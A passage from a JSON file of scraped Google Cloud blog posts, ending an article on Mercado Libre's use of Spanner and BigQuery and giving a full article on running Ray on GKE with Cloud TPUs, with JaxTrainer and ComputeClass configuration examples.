style=\"vertical-align: baseline;\">queries per second</span><strong style=\"vertical-align: baseline;\"> (QPS)</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">30K </strong><span style=\"vertical-align: baseline;\">transactions per second </span><strong style=\"vertical-align: baseline;\">(TPS)</strong><span style=\"vertical-align: baseline;\">. To manage this substantial workload, the Spanner infrastructure dynamically scales to over </span><strong style=\"vertical-align: baseline;\">400 nodes (by 30%)</strong><span style=\"vertical-align: baseline;\">, highlighting the robust and elastic nature of the underlying system in accommodating high-demand scenarios. This level of throughput and scalability is critical for maintaining the performance and reliability of Mercado Libre's services during its busiest times.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_ZAe7FJs.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Fig. 2 - Diagram of the solution built with Spanner, which uses current search data to predict and recommend products that a customer is most likely to purchase.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Turning data into action</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre builds a dynamic data ecosystem around Spanner, leveraging advanced analytics to feed insights directly back into operational systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">They achieve real-time analytics by combining Spanner Data Boost with BigQuery Federation. Data Boost isolates analytical queries, preventing them from impacting critical transactional performance. This allows for powerful, large-scale analytics to run directly on fresh Spanner data within BigQuery, integrating seamlessly with other data sources.</span></p>\n<p><span style=\"vertical-align: baseline;\">Insights from BigQuery, such as customer segmentations or fraud scores, are then actioned via Reverse ETL, feeding directly back into Spanner. This enriches operational data, enabling immediate action by frontline applications like serving personalized content or performing real-time risk assessments.</span></p>\n<p><span style=\"vertical-align: baseline;\">Furthermore, Spanner Change Streams coupled with Dataflow drive crucial service integrations. By capturing real-time data modifications from Spanner, they establish robust pipelines. These enable loading changes into BigQuery for analytics or streaming them to services like Fury Stream for real-time consumption, ensuring low-latency data propagation and enabling event-driven architectures across their systems.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The impact: cost savings, agility, and future-proofing</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The strategic adoption of Spanner, amplified by internal platforms like Fury and sophisticated data workflows, has yielded significant benefits for Mercado Libre:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Significant cost savings &amp; low total cost of ownership:</strong><span style=\"vertical-align: baseline;\"> The combination of Spanner's managed nature (reducing manual sharding, maintenance, and maintenance work), efficient resource utilization, and the abstraction provided by Fury has led to a lower Total Cost of Ownership and substantial cost savings.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Business impact &amp; agility:</strong><span style=\"vertical-align: baseline;\"> Developers, freed from infrastructure complexities by Fury and empowered by Spanner's versatile capabilities, can deliver new features and applications faster. The reliability of Spanner underpins critical business operations, minimizing disruptions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Low operational overhead:</strong><span style=\"vertical-align: baseline;\"> Automated scaling, sharding, and maintenance in Spanner significantly reduce the human effort required to manage large-scale database infrastructure.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Building for AI:\u00a0 Next-generation applications on Spanner</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Looking ahead, Mercado Libre is exploring Spanner to support more AI workloads.</span></p>\n<p><span style=\"vertical-align: baseline;\">Spanner's characteristics make it an ideal foundation:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consistent state management:</strong><span style=\"vertical-align: baseline;\"> Critical for AI systems that need to maintain and reliably update their state context.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scalable memory/knowledge store:</strong><span style=\"vertical-align: baseline;\"> Ability to store and retrieve vast amounts of data for AI system memory, logs, and contextual information.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Transactional operations:</strong><span style=\"vertical-align: baseline;\"> Enabling AI systems to perform reliable actions that interact with other systems.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Integration with analytics &amp; Machine Learning (ML):</strong><span style=\"vertical-align: baseline;\"> The existing data loops and ML.PREDICT capabilities can enrich AI systems with real-time insights and intelligence.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Spanner provides the transactional foundation\u00a0 these sophisticated, AI applications will require.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Conclusion: A Unified, Intelligent Data Foundation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre's adoption of Spanner demonstrates how to use a powerful, globally consistent database not just for its core capabilities, but as a strategic enabler for developer productivity, operational efficiency, advanced analytics, and future AI ambitions. Through their Fury platform, they've simplified access to Spanner's capabilities, allowing it to serve as a flexible foundation for both relational and non-relational needs. The integration with BigQuery via Data Boost demonstrates a comprehensive approach to building an intelligent, data-driven enterprise. As Mercado Libre builds AI applications, Spanner is set to continue its role as the consistent and scalable foundation for their next wave of innovation.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Learn more</strong></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/spanner\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Discover how Spanner can transform your business</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/spanner/docs/free-trial-quickstart\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get started on Spanner today with a 90 day free trial instance.</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-03 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/containers-kubernetes/ray-on-tpus-with-gke-a-more-native-experience/",
        "title": "A more native experience for Cloud TPUs with Ray on GKE",
        "thumbnail": null,
        "author": "Ryan O'Leary",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Engineering teams use Ray to scale AI workloads across a wide range of hardware, including both GPUs and Cloud TPUs. While Ray provides the core scaling capabilities, developers have often managed the unique architectural details of each accelerator. For Cloud TPUs, this included its specific networking model and Single Programming Multiple Data (SPMD) programming style.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">As part of </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/partnering-with-anyscale-to-integrate-rayturbo-with-gke?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our partnership with Anyscale</span></a><span style=\"vertical-align: baseline;\">, we are working on reducing the engineering effort to get started with TPUs on Google Kubernetes Engine (GKE). Our goal is to make the Ray experience on TPUs as native and low-friction as possible.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we are launching several key improvements that help make that possible.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Ray TPU Library for improved TPU awareness and scaling in Ray Core</strong></h3>\n<p><span style=\"vertical-align: baseline;\">TPUs have a unique architecture and a specific programming style called SPMD. Large AI jobs run on a TPU slice, which is a collection of chips connected by high-speed networking called interchip interconnect (ICI).</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_oDu45Si.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Previously, you needed to manually configure Ray to be aware of this specific hardware topology. This was a major setup step, and if done incorrectly, jobs could get fragmented resources from different, unconnected slices, causing severe performance bottlenecks.</span></p>\n<p><span style=\"vertical-align: baseline;\">This new library, </span><code style=\"vertical-align: baseline;\">ray.util.tpu</code><span style=\"vertical-align: baseline;\">, abstracts away these hardware details. It uses a feature called </span><code style=\"vertical-align: baseline;\">SlicePlacementGroup</code><span style=\"vertical-align: baseline;\"> along with the new </span><code style=\"vertical-align: baseline;\">label_selector</code><span style=\"vertical-align: baseline;\"> API to automatically reserve the entire, co-located TPU slice as one atomic unit. This guarantees the job runs on unified hardware, preventing performance issues from fragmentation. Because Ray couldn't guarantee this single-slice atomicity before, building reliable true multi-slice training (which intentionally spans multiple unique slices) was impossible. This new API also provides the critical foundation for Ray users to use Multislice technology to scale using multiple TPU slices.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Expanded support for Jax, Ray Train and Ray Serve\u00a0</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our developments cover both training and inference. For training, Ray Train now offers alpha support for JAX (via </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/tutorials/distributed-training-tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">JaxTrainer</span></a><span style=\"vertical-align: baseline;\">) and PyTorch on TPUs.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">JaxTrainer</code><span style=\"vertical-align: baseline;\"> API simplifies running JAX workloads on multi-host TPUs. It now automatically handles the complex distributed host initialization. As shown in the code example below, you only need to define your hardware needs\u2014like the number of workers, topology, and accelerator type\u2014within a simple </span><code style=\"vertical-align: baseline;\">ScalingConfig</code><span style=\"vertical-align: baseline;\"> object. The </span><code style=\"vertical-align: baseline;\">JaxTrainer</code><span style=\"vertical-align: baseline;\"> takes care of the rest.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is a significant improvement because it solves a critical performance problem: resource fragmentation. Previously, a job requesting a \"4x4\" topology (which must run on a single co-located hardware unit called a slice) could instead receive fragmented resources\u2014for example, eight chips from one physical slice and eight chips from a different, unconnected slice. This fragmentation was a major bottleneck, as it prevented the workload from using the high-speed ICI interconnect that only exists within a single, unified slice.</span></p>\n<p><span style=\"vertical-align: baseline;\">Example of how the JaxTrainer simplifies training on multi-host TPU:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;import jax\\r\\nimport jax.numpy as jnp\\r\\nimport optax\\r\\nimport ray.train\\r\\n\\r\\nfrom ray.train.v2.jax import JaxTrainer\\r\\nfrom ray.train import ScalingConfig\\r\\n\\r\\ndef train_func():\\r\\n&quot;&quot;&quot;This function is run on each distributed worker.&quot;&quot;&quot;\\r\\n...\\r\\n\\r\\n# Define the hardware configuration for your distributed job.\\r\\nscaling_config = ScalingConfig(\\r\\nnum_workers=4,\\r\\nuse_tpu=True,\\r\\ntopology=&quot;4x4&quot;,\\r\\naccelerator_type=&quot;TPU-V6E&quot;,\\r\\nplacement_strategy=&quot;SPREAD&quot;\\r\\n)\\r\\n\\r\\n# Define and run the JaxTrainer.\\r\\ntrainer = JaxTrainer(\\r\\ntrain_loop_per_worker=train_func,\\r\\nscaling_config=scaling_config,\\r\\n)\\r\\nresult = trainer.fit()\\r\\nprint(f&quot;Training finished on TPU v6e 4x4 slice&quot;)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe168097250&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ray Serve APIs support TPUs and with the improvements we have made to </span><a href=\"https://blog.vllm.ai/2025/10/16/vllm-tpu.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vLLM TPU</span></a><span style=\"vertical-align: baseline;\">, you can continue to use Ray on vLLM when moving to TPUs. This allows you to use the same stack you use on GPUs and run it on TPUs with minimal code changes.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Label-based Scheduling API for easy obtainability</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The new </span><a href=\"https://www.anyscale.com/blog/introducing-label-selectors-scheduling-ray\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Label-Based Scheduling API</span></a><span style=\"vertical-align: baseline;\"> integrates with </span><a href=\"https://cloud.google.com/blog/products/containers-kubernetes/introducing-new-gke-custom-compute-class-api/\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">GKE</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> </span><strong style=\"text-decoration: underline; vertical-align: baseline;\">custom compute classes</strong></a><span style=\"vertical-align: baseline;\">. A custom compute class is a simple way to define a named hardware configuration. For example, you can create a class called </span><code style=\"vertical-align: baseline;\">cost-optimized</code><span style=\"vertical-align: baseline;\"> that tells GKE to try acquiring a Spot instance first, then fall back to a </span><a href=\"https://cloud.google.com/products/dws/pricing?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Workload Scheduler</span></a><span style=\"vertical-align: baseline;\"> FlexStart instance, and finally to a reserved instance as a last resort. The new Ray API lets you use classes directly from Python. With a simple </span><code style=\"vertical-align: baseline;\">label_selector</code><span style=\"vertical-align: baseline;\">, you can request hardware like \"TPU-V6E\" or target your </span><code style=\"vertical-align: baseline;\">cost-optimized</code><span style=\"vertical-align: baseline;\"> class, all without managing separate YAML files.</span></p>\n<p><span style=\"vertical-align: baseline;\">This same </span><code style=\"vertical-align: baseline;\">label_selector </code><span style=\"vertical-align: baseline;\">mechanism also exposes deep hardware control for TPUs. As GKE provisions the TPU pods for a slice, it injects metadata (like worker rank and topology) into each one. KubeRay (which manages Ray on GKE) then reads this GKE-provided metadata and automatically translates it into Ray-specific labels as it creates the nodes. This provides key information like the TPU generation (ray.io/accelerator-type), the physical chip topology (ray.io/tpu-topology), and the worker rank within the slice (</span><span style=\"vertical-align: baseline;\">ray.io/tpu-worker-id</span><span style=\"vertical-align: baseline;\">).</span></p>\n<p><span style=\"vertical-align: baseline;\">These node labels let you use a Ray label_selector to pin SPMD workloads to specific, co-located hardware, such as a \"4x4\" topology or a particular worker rank.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the example below, a Ray user can request a v6e-32 TPU slice but instruct GKE to use custom compute classes to fallback to v5e-16 if that\u2019s not available. Similarly, the user could start by requesting spot or DWS resources and if not available, fallback to reservation instances.\u00a0</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Developers select compute and nodepools</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Platform Admins set up Kubernetes\u00a0</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">@ray.remote(num_cpu=1,<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0label_selector={<br /></span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0\"ray.io/tpu-pod-type\": \"v6e-32\",</span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u201cgke-flex-start\u201d: \u201ctrue\u201d,<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0},<br /></span><span style=\"vertical-align: baseline;\">\u00a0</span><strong style=\"vertical-align: baseline;\">\u00a0fallback_strategy</strong><span style=\"vertical-align: baseline;\">=[<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0{\"label_selector\": {<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"ray.io/tpu-pod-type\": \"v5litepod-16\",</span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0 <br /><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span>\u201creservation-name\u201d: \u201c</span><strong style=\"vertical-align: baseline;\">v5e-reservation</strong><span style=\"vertical-align: baseline;\">\u201d,<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0},<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0]<br /></span><span style=\"vertical-align: baseline;\">)<br /></span><span style=\"vertical-align: baseline;\">def tpu_task():<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0# Attempts to run on a node in a v6e 4x8<br /></span><span style=\"vertical-align: baseline;\">\u00a0 # TPU slice, falling back to a node in a<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0# v5e 4x4 TPU if v6e is unavailable.</span><span style=\"vertical-align: baseline;\">\u00a0<br />\u2026</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">apiVersion: cloud.google.com/v1<br /></span><span style=\"vertical-align: baseline;\">kind: ComputeClass<br /></span><span style=\"vertical-align: baseline;\">metadata:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0name: cost-optimized<br /></span><span style=\"vertical-align: baseline;\">spec:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0priorities:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0- flexStart:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0enabled: true<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0tpu:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0type: tpu-v6e-slice<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0count: 8<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0topology: 4x8</span><span style=\"vertical-align: baseline;\">\u00a0\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">\u00a0\u00a0- tpu:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0type: tpu-v5-lite-podslice<br /></span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0count: 4<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0topology: 4x4<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0reservations:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0specific:<br /></span><span style=\"vertical-align: baseline;\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- name: </span><strong style=\"vertical-align: baseline;\">v5e-reservation<br /></strong><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0 \u00a0 - affinity: Specific</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3><strong style=\"vertical-align: baseline;\">TPU metrics and logs in one place</strong></h3>\n<p><span style=\"vertical-align: baseline;\">You can now see key TPU performance metrics, like TensorCore utilization, duty cycle, High-Bandwidth Memory (HBM) usage, and memory bandwidth utilization, directly in the Ray Dashboard. We\u2019ve also added low-level </span><code style=\"vertical-align: baseline;\">libtpu</code><span style=\"vertical-align: baseline;\"> logs. This makes debugging much faster, as you can immediately check if a failure is caused by the code or by the TPU hardware itself.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Together, these updates are a significant step toward making TPUs a seamless part of the Ray ecosystem. They make adapting your existing Ray applications between GPUs and TPUs a much more straightforward process. Here\u2019s how to learn more and get started:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Review the documentation:</strong><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.ray.io/en/latest/cluster/kubernetes/user-guides/tpu.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Use TPUs with Kuberay</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">JAX Workloads:</strong><span style=\"vertical-align: baseline;\"> See the new </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/tutorials/distributed-training-tpu\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get Started with JAX guide</span></a><span style=\"vertical-align: baseline;\"> for using the JaxTrainer and </span><a href=\"https://docs.ray.io/en/master/train/getting-started-jax.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">learn more about JaxTrain</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TPU metrics: </strong><a href=\"https://docs.cloud.google.com/kubernetes-engine/docs/add-on/ray-on-gke/how-to/view-tpu-metrics\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">View TPU metrics</span></a><span style=\"vertical-align: baseline;\"> in Ray Dashboard or Grafana</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Request TPU capacity:</strong><span style=\"vertical-align: baseline;\"> Get started quickly with </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/how-to/dws-flex-start-training-tpu\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">DWS Flex Start</strong><span style=\"text-decoration: underline; vertical-align: baseline;\"> for TPUs</span></a><span style=\"vertical-align: baseline;\">, which provides access to TPUs for jobs that run for less than 7 days.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Related Content: </span><a href=\"https://jax-ml.github.io/scaling-book/index\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Intro to TPUs</span></a></li>\n</ol></div>\n<div class=\"block-related_article_tout\">\n\n\n\n\n\n<div class=\"uni-related-article-tout h-c-page\">\n  <section class=\"h-c-grid\">\n    <a class=\"uni-related-article-tout__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n        h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3 uni-click-tracker\" href=\"https://cloud.google.com/blog/products/containers-kubernetes/ray-on-gke-new-features-for-ai-scheduling-and-scaling/\">\n      <div class=\"uni-related-article-tout__inner-wrapper\">\n        <p class=\"uni-related-article-tout__eyebrow h-c-eyebrow\">Related Article</p>\n\n        <div class=\"uni-related-article-tout__content-wrapper\">\n          <div class=\"uni-related-article-tout__image-wrapper\">\n            <div class=\"uni-related-article-tout__image\"></div>\n          </div>\n          <div class=\"uni-related-article-tout__content\">\n            <h4 class=\"uni-related-article-tout__header h-has-bottom-margin\">Evolving Ray and Kubernetes together for the future of distributed AI and ML</h4>\n            <p class=\"uni-related-article-tout__body\">Ray on Kubernetes now has new label-based scheduling, DRA for accelerators, writable cgroups, and vertical pod resizing for distributed A...</p>\n            <div class=\"cta module-cta h-c-copy  uni-related-article-tout__cta muted\">\n              <span class=\"nowrap\">Read Article\n                <svg class=\"icon h-c-icon\" xmlns=\"http://www.w3.org/2000/svg\">\n                  <use xlink:href=\"#mi-arrow-forward\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n                </svg>\n              </span>\n            </div>\n          </div>\n        </div>\n      </div>\n    </a>\n  </section>\n</div>\n\n</div>",
        "published_date": "2025-11-03 17:00:00"
    }
]